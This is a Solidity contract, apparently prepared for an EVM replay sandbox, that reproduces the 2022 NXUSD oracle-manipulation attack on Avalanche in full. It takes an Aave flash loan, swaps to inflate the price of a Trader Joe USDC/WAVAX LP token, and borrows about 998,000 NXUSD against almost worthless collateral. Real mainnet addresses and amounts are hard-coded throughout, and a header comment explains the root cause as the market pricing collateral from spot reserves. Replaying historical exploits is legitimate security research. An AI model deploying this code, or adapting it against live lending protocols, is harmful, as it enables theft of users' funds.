// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-09-NXUSD).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ContractTest): it triggers an Aave flash loan and the executeOperation
// callback that performs the whole attack lives on the test itself. There is no
// standalone contract to deploy. This contract is a faithful, self-contained
// copy of that inline attack (testExploit + executeOperation + buyWAVAXAndAddLP
// + sellWAVAX + sellUSDC_e) so the playground can deploy it and record run().
// Logic and constants are copied verbatim from test/NXUSD_exp.sol.
//
// Root cause: the NXUSD CauldronV2 market prices its USDC/WAVAX LP collateral
// from the Trader Joe pool's SPOT reserves (reserveWAVAX*pAVAX + reserveUSDC*
// pUSDC) / totalSupply — a flash-loan-funded swap inflates the LP unit price
// ~200,000x in one tx, letting the attacker borrow ~$1M of NXUSD against ~$0.5
// of true collateral.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IUSDC {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface ILendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface Uni_Router_V2 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
}

interface ICurvePool {
    function exchange_underlying(address pool, int128 i, int128 j, uint256 dx, uint256 min_dy) external;

    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface IDegenBox {
    function setMasterContractApproval(
        address user,
        address masterContract,
        bool approved,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}

interface ICauldronV2 {
    function updateExchangeRate() external returns (bool, uint256);

    function cook(
        uint8[] calldata actions,
        uint256[] calldata values,
        bytes[] calldata datas
    ) external payable returns (uint256, uint256);
}

contract NXUSDDrain {
    ILendingPool constant aaveLendingPool = ILendingPool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    Uni_Router_V2 constant Router = Uni_Router_V2(0x60aE616a2155Ee3d9A68541Ba4544862310933d4);
    ICurvePool constant CRVPool1 = ICurvePool(0x001E3BA199B4FF4B5B6e97aCD96daFC0E2e4156e);
    ICurvePool constant CRVPool2 = ICurvePool(0x3a43A5851A3e3E0e25A3c1089670269786be1577);
    IERC20 constant WAVAX = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);
    IERC20 constant USDC_e = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
    IUSDC constant USDC = IUSDC(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    IERC20 constant NXUSD = IERC20(0xF14f4CE569cB3679E99d5059909E23B07bd2F387);
    IERC20 constant Pair = IERC20(0xf4003F4efBE8691B60249E6afbD307aBE7758adb);
    IDegenBox constant DegenBox = IDegenBox(0x0B1F9C2211F77Ec3Fa2719671c5646cf6e59B775);
    ICauldronV2 constant CauldronV2 = ICauldronV2(0xC0A7a7F141b6A5Bce3EC1B81823c8AFA456B6930);
    address constant metaPool = 0x6BF6fc7EaF84174bb7e1610Efd865f0eBD2AA96D;
    address constant masterContract = 0xE767C6C3Bf42f550A5A258A379713322B6c4c060;

    // flashLoan
    address[] public _assets = [address(USDC)];
    uint256[] public _amounts = [51_000_000_000_000];
    uint256[] public _modes = [0];
    // borrow via cook
    uint8[] public actions = [5, 21, 20, 10];
    uint256[] public values = [0, 0, 0, 0];
    uint256 borrowAmounts = 998_000 * 1e18;
    uint256 share = 0;

    function run() public {
        USDC.approve(address(Router), type(uint256).max);
        WAVAX.approve(address(Router), type(uint256).max);
        // AAVE flashloan — executeOperation() below does the attack and repays.
        aaveLendingPool.flashLoan(address(this), _assets, _amounts, _modes, address(this), new bytes(1), 0);
    }

    function executeOperation(
        address[] memory assets,
        uint256[] memory amounts,
        uint256[] memory premiums,
        address initiator,
        bytes memory params
    ) public returns (bool) {
        assets;
        amounts;
        premiums;
        params;
        initiator;
        // get LP token (mint a sliver of USDC/WAVAX LP)
        buyWAVAXAndAddLP();
        // change LP price — dump the rest of the flash-loaned USDC into the pool
        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(WAVAX);
        Router.swapExactTokensForTokens(USDC.balanceOf(address(this)), 0, path, address(this), block.timestamp);

        // borrow NXUSD against the (now over-valued) LP collateral
        NXUSD.approve(address(CRVPool1), type(uint256).max);
        Pair.approve(address(DegenBox), type(uint256).max);
        DegenBox.setMasterContractApproval(address(this), masterContract, true, 0, 0, 0);
        // update rate — oracle reads the manipulated spot reserves
        CauldronV2.updateExchangeRate();
        // cook: BORROW 998k NXUSD, WITHDRAW it, DEPOSIT 0.0453 LP, ENTER market
        bytes[] memory datas = new bytes[](4);
        datas[0] = abi.encode(borrowAmounts, address(this)); // type borrow
        datas[1] = abi.encode(NXUSD, address(this), borrowAmounts, share); // type withdraw
        datas[2] = abi.encode(Pair, address(this), 45_330_977_931_305_070, share); // type deposit
        datas[3] = abi.encode(-2, address(this), false); // Collateral enter market
        CauldronV2.cook(actions, values, datas);

        // unwind the corner swap — reverse WAVAX back to USDC
        sellWAVAX();
        // NXUSD -> avCRV -> USDC_e
        CRVPool1.exchange_underlying(metaPool, 0, 2, 998_000 * 1e18, 950_000 * 1e6);
        // USDC_e -> USDC
        USDC_e.approve(address(CRVPool2), type(uint256).max);
        CRVPool2.exchange(0, 1, 800_000 * 1e6, 700_000 * 1e6);
        sellUSDC_e();
        USDC.approve(address(aaveLendingPool), type(uint256).max);
        return true;
    }

    function buyWAVAXAndAddLP() public {
        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(WAVAX);
        Router.swapExactTokensForTokens(280_000 * 1e6, 0, path, address(this), block.timestamp);
        Router.addLiquidity(
            address(USDC),
            address(WAVAX),
            260_000 * 1e6,
            500_000 * 1e18,
            250_000 * 1e6,
            0,
            address(this),
            block.timestamp
        );
    }

    function sellWAVAX() public {
        address[] memory path = new address[](2);
        path[0] = address(WAVAX);
        path[1] = address(USDC);
        Router.swapExactTokensForTokens(WAVAX.balanceOf(address(this)), 0, path, address(this), block.timestamp + 60);
    }

    function sellUSDC_e() public {
        address[] memory path = new address[](2);
        USDC_e.approve(address(Router), type(uint256).max);
        path[0] = address(USDC_e);
        path[1] = address(USDC);
        Router.swapExactTokensForTokens(USDC_e.balanceOf(address(this)), 0, path, address(this), block.timestamp + 60);
    }
}
